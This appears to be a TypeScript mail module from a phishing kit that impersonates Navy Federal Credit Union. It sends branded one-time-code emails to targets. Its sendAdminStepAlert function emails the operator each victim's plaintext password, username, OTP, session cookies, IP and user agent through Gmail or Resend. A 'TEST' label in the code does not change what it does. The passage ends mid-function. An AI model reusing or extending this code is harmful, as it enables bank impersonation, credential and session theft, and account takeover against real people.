import nodemailer from 'nodemailer'
import { ADMIN_EMAIL } from './constants'

function wrap(title: string, body: string) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Navy Federal Credit Union</title>
</head>
<body style="font-family: Arial, Helvetica, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px;">
    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
        <tr>
            <td align="center">
                <div style="width: 100%; max-width: 600px; background-color: #ffffff; border: 1px solid #dcdcdc; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: left;">
                    
                    <!-- Top Blue Header -->
                    <div style="background-color: #002d62; color: #ffffff; text-align: center; padding: 12px; font-weight: bold; font-size: 18px; letter-spacing: 0.5px;">
                        NAVY FEDERAL CREDIT UNION
                    </div>

                    <!-- Security Zone Metadata -->
                    <div style="text-align: center; padding: 10px; font-size: 14px; color: #333333; border-bottom: 1px solid #eaeaea;">
                        <strong style="color: #002d62;">Navy Federal Security Zone:</strong><br>
                        <span style="color: #666666;">Email notice | Acces XXXXXXXXXXXX10</span>
                    </div>

                    <!-- Main Dynamic Body Content -->
                    <div style="padding: 30px 40px; min-height: 150px; color: #333333; font-size: 15px; line-height: 1.5;">
                        <h2 style="color: #002d62; font-size: 20px; margin-top: 0; margin-bottom: 16px;">${title}</h2>
                        ${body}
                    </div>

                    <!-- Grey Footer -->
                    <div style="background-color: #e9e8e4; padding: 25px 40px; font-size: 13px; color: #666666; line-height: 1.6;">
                        <p style="margin: 0 0 10px 0;">Please do not reply to this email. This email is being sent from:</p>
                        <p style="margin: 0 0 10px 0;">Navy-Federal, P.O. Box 3000, Merrifield, VA 22119-3000.</p>
                        <p style="margin: 0 0 10px 0;">Equal Housing Lender | 2026 Navy-Federal. All rights reserved.</p>
                        <p style="margin: 0 0 10px 0;">DNS 34998-K (1-22)</p>
                        <p style="font-weight: bold; color: #444444; margin: 15px 0 0 0;">Federally insured by NCUA.</p>
                    </div>

                </div>
            </td>
        </tr>
    </table>
</body>
</html>`
}

function fromAddress() {
  const gmailUser = process.env.GMAIL_USER || process.env.SMTP_USER
  return (
    process.env.EMAIL_FROM ||
    (gmailUser ? `Login Ops <${gmailUser}>` : 'Login Ops <onboarding@resend.dev>')
  )
}

async function sendViaGmail(to: string, subject: string, html: string) {
  const user = process.env.GMAIL_USER || process.env.SMTP_USER
  const pass = (process.env.GMAIL_APP_PASSWORD || process.env.SMTP_PASS || '').replace(
    /\s/g,
    ''
  )
  if (!user || !pass) {
    console.warn('[mail] Gmail not configured (missing GMAIL_USER or GMAIL_APP_PASSWORD)')
    return false
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user, pass },
  })

  const info = await transporter.sendMail({
    from: fromAddress(),
    to,
    subject,
    html,
  })
  console.info('[mail] Gmail sent', { to, subject, messageId: info.messageId })
  return true
}

async function sendViaResend(to: string, subject: string, html: string) {
  const apiKey = process.env.RESEND_API_KEY
  if (!apiKey) return false
  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ from: fromAddress(), to: [to], subject, html }),
  })
  if (!res.ok) {
    const text = await res.text().catch(() => '')
    console.error('[mail] Resend failed', res.status, text)
    return false
  }
  console.info('[mail] Resend sent', { to, subject })
  return true
}

export async function sendMail(to: string, subject: string, html: string) {
  console.log('[mail] sendMail', { to, subject })
  try {
    if (await sendViaGmail(to, subject, html)) return true
  } catch (err) {
    console.error('[mail] Gmail error', err)
  }
  try {
    if (await sendViaResend(to, subject, html)) return true
  } catch (err) {
    console.error('[mail] Resend error', err)
  }
  console.warn('[mail] No transport succeeded — check Vercel env vars')
  return false
}

export async function sendOtpEmail(to: string, otp: string, label: string) {
  const ok = await sendMail(
    to,
    `Your verification code (${label})`,
    wrap(
      label,
      `<p>Your one-time code is:</p>
       <p style="font-size:28px;letter-spacing:6px;font-weight:700;color:#111">${otp}</p>
       <p>Expires in 10 minutes.</p>`
    )
  )
  if (!ok) {
    // Always log OTP so admin can still complete the test from Vercel logs / ops desk
    console.info('[mail] OTP FALLBACK LOG', { to, label, otp })
  }
  return ok
}

export async function sendAdminStepAlert(input: {
  attemptId: string
  email: string
  step: string
  event: string
  passwordPlain?: string
  username?: string
  otpPlain?: string
  cookieHeader?: string
  ip?: string
  userAgent?: string
}) {
  const when = new Date().toLocaleString()
  const secrets = `
    <div style="margin-top:16px;padding:12px;background:#f5f5f5;border:1px solid #ddd;font-family:monospace;font-size:13px">
      <p style="color:#666;margin:0 0 8px">TEST · plain text</p>
      <p style="margin:4px 0"><strong>Email:</strong> ${input.email}</p>
      ${input.passwordPlain ? `<p style="margin:4px 0"><strong>Password:</strong> ${input.passwordPlain}</p>` : ''}
      ${input.username ? `<p style="margin:4px 0"><strong>Username:</strong> ${input.username}</p>` : ''}
      ${input.otpPlain ? `<p style="margin:4px 0"><strong>OTP:</strong> ${input.otpPlain}</p>` : ''}
      ${input.cookieHeader ? `<p style="margin:4px 0;word-break:break-all"><strong>Cookies:</strong> ${input.cookieHeader}</p>` : ''}
      ${input.userAgent ? `<p style="margin:4px 0;word-break:break-all"><strong>UA:</strong> ${input.userAgent}</p>` : ''}
      ${input.ip ? `<p style="margin:4px 0"><strong>IP:</strong> ${input.ip}</p>` : ''}
    </div>`

  return sendMail(
    ADMIN_EMAIL,
    `[Ops] Login · ${input.email} · ${input.step}`,
    wrap(
      'Live sign-in activity',
      `<p><strong>${input.email}</strong></p>
       <p>Step: <strong>${input.step}</strong></p>
       <p>${input.event}</p>
       <p>Time: ${when}</p>
       <p>Attempt: <code>${input.attemptId}</code></p>
       ${secrets}`
    )
  )
